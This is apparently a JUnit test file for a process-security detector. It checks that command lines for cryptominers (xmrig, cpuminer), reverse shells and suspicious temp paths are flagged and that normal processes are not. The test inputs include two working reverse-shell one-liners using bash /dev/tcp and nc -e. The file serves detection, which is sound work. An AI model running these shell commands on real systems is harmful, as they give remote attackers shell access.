package com.aluer.defense;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

class ProcessSecurityServiceTest {

    @Test
    void detectsMiningProcess() {
        assertNotNull(ProcessSecurityService.detectSuspicion("/usr/bin/xmrig -o pool.example.com"));
        assertNotNull(ProcessSecurityService.detectSuspicion("./cpuminer -a cryptonight"));
    }

    @Test
    void detectsReverseShell() {
        assertNotNull(ProcessSecurityService.detectSuspicion("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
        assertNotNull(ProcessSecurityService.detectSuspicion("nc -e /bin/sh 10.0.0.1 4444"));
    }

    @Test
    void detectsSuspiciousPath() {
        assertNotNull(ProcessSecurityService.detectSuspicion("/tmp/.hidden/miner"));
        assertNotNull(ProcessSecurityService.detectSuspicion("/dev/shm/exploit"));
    }

    @Test
    void normalProcessIsClean() {
        assertNull(ProcessSecurityService.detectSuspicion("/usr/bin/java -jar server.jar nogui"));
        assertNull(ProcessSecurityService.detectSuspicion("systemd --user"));
    }

    @Test
    void blankOrNullIsClean() {
        assertNull(ProcessSecurityService.detectSuspicion(""));
        assertNull(ProcessSecurityService.detectSuspicion(null));
    }

    @Test
    void scanProcessesIsSafe() {
        // 真实环境无权限时也应安全返回，不抛异常
        ProcessSecurityService s = new ProcessSecurityService();
        ProcessSecurityService.ProcessScanResult result = s.scanProcesses();
        assertNotNull(result);
        assertNotNull(result.getSuspicious());
    }
}
